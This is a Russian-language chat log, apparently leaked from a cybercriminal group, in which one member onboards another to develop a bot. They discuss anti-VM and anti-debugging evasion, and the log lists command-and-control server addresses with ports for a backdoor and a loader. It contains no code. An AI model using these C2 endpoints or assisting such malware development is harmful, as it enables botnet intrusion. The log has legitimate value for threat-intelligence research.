Timestamp	From	To	Message
2020-07-13 12:25:33.067789	mushroom	price	Как успехи?
2020-07-13 13:39:37.509169	price	mushroom	включаюсь в тему
2020-07-13 13:40:07.610067	price	mushroom	завтра отпишусь
2020-07-13 13:40:20.263518	mushroom	price	OK.
2020-07-13 13:41:53.134943	price	mushroom	 у меня что-то github.com целый день то отрубится, то какой-то не такой без поиска вылезает
2020-07-13 13:42:17.537909	price	mushroom	не попадалось такое?
2020-07-13 13:45:15.177889	mushroom	price	Было такое, когда телеграм пытались заблокировать, и попутно кучу подсетей.
2020-07-13 13:46:07.490671	price	mushroom	я страдал целый день этим, сейчас перед тем как тебя спросить проверил-а оно работает.
2020-07-13 13:46:22.505757	price	mushroom	Но реально я первый раз в жизни увидел
2020-07-13 13:46:25.890830	price	mushroom	такоке
2020-07-13 13:47:31.590290	price	mushroom	ты всякие обманы делал ВМ и дебага? я пока просто спрашиваю, сначала функционал буду делать
2020-07-13 13:48:04.005800	price	mushroom	или это вообще не критично?
2020-07-13 13:48:19.085873	mushroom	price	Нет. Не делал. Пока не критично.
2020-07-13 13:48:28.389114	price	mushroom	хорошо
2020-07-14 14:02:30.266500	mushroom	price	Привет. Начал что делать? С какого числа будешь делать?
2020-07-14 14:02:52.508023	price	mushroom	да хоть с сегодня
2020-07-14 14:03:07.168601	price	mushroom	но перед делать надо вопросы прояснитьь
2020-07-14 14:03:09.857863	price	mushroom	а их много
2020-07-14 14:03:40.675536	price	mushroom	с Бузой уже сегодня поговорил, он мне про эмеркойны рассказал
2020-07-14 14:04:03.369138	price	mushroom	подскажи мне пожалуйста про те адреса, что мне дали
2020-07-14 14:04:15.012748	price	mushroom	на один я сходил, он называется ботнет
2020-07-14 14:04:28.777881	price	mushroom	что там можно делать?
2020-07-14 14:04:35.544171	mushroom	price	Какие адреса?
2020-07-14 14:05:27.134676	price	mushroom	 https://51.89.125.28:12280
2020-07-14 14:05:47.082837	price	mushroom	тестовый сервере где будешь тестировать работу
2020-07-14 14:05:51.149351	mushroom	price	Это сервер который командует твоим ботом.
2020-07-14 14:05:57.840572	price	mushroom	Адрес для подключения в программе для бэкдор http://51.89.125.28:12232
2020-07-14 14:06:08.123799	price	mushroom	 Для загрузчика http://51.89.125.28:12234
2020-07-14 14:06:12.984233	mushroom	price	Ты будешь через него команды давать своей программе.
2020-07-14 14:06:56.953377	price	mushroom	язашел на него, там набор адресов, с расширением базар
2020-07-14 14:06:59.048568	mushroom	price	http://51.89.125.28:12232 адрес сервера для бота, http://51.89.125.28:12234 для загрузчика.
